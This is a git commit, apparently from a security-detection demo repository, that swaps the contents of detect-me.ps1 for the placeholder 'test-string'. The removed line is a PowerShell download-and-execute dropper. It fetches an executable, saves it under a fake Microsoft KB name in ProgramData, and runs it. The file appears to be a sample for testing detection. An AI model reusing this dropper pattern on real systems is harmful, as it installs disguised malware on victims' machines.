5feae253cf1930604a0fc3f16931569c192b5c08
esg-sadmin <sadmin@bcm-demo514.com>
2026-02-10 22:50:55 +0000

    putting benign string in the file
    putting benign string in the file

--- detect-me.ps1
+++ detect-me.ps1
@@ -1,2 +1,1 @@
-powershell -command "(new-object system.net.webclient).downloadfile('http://0.0.0.0/shample/shample_fixed.exe','c:\programdata\microsoft-kb510661.exe');(new-object -com shell.application).shellexecute('c:\programdata\microsoft-kb510661.exe');"
-
+test-string
